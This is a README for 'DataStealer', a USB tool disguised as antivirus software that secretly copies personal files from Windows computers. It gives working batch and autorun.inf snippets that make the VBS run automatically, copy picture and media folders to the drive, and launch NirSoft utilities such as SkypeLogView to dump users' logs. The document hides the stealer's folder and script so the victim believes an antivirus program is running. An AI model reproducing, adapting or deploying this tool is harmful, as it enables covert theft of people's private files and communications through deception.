# DataStealer

## Information
DataStealer pretends be a Antivirus USB to gather personal information in Windows systems.

## Intructions
Just copy all files/folders and paste in USB device. Hide **"data"** folder and **"run.bat"**. When you conect USB device in Windows system just doble click in AntivirusUSB.vbs and DataStealer copy all files stealthily from pc.

***NOTE: You can use autotun.inf for auto-execute .vbs file but it only works in Windows Vista and Windows XP***

[**Autorun.inf**](wikipedia.org/wiki/AutoRun "Wikipedia")
>[AutoRun]
>
>Open=AntivirusUSB.vbs

## Configuration

### Folders
If you want you can add more lines with folders in **"run.bat"** for gather information

Like this:
>REM ############ Formats ############
>
>FOR /R **"%userprofile%\Pictures\"** %%a IN (%rest%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")
>
>REM #################################

Replace **"%userprofile%\Pictures\"** for any folder.

### Formats
If you want you can add more formats in **"run.bat"** of files to gather

Like this:
>REM ############ Formats ############
>
>set rest= \*.jpg,\*.png,\*.mp4,\*.3gp,\*.wav,**\*.avi**
>
>REM #################################

### More funcionalities (Nirsoft)
NirSoft web site provides a unique collection of small and useful freeware utilities, all of them developed by Nir Sofer. 

For more funcionalities, go to [nirsoft.net](www.nirsoft.net "Nirsoft"), download software and put in "data/soft/" folder

Later add a line for each software in **"run.bat"**

Like this:
>REM ############ Nirsoft ############
>
>start data/soft/**SkypeLogView**.exe /shtml "data\pss\%USERNAME%\\**SkypeLogView**.html"
>
>REM #################################

Replace **SkypeLogView** in both places with the software name

# Download
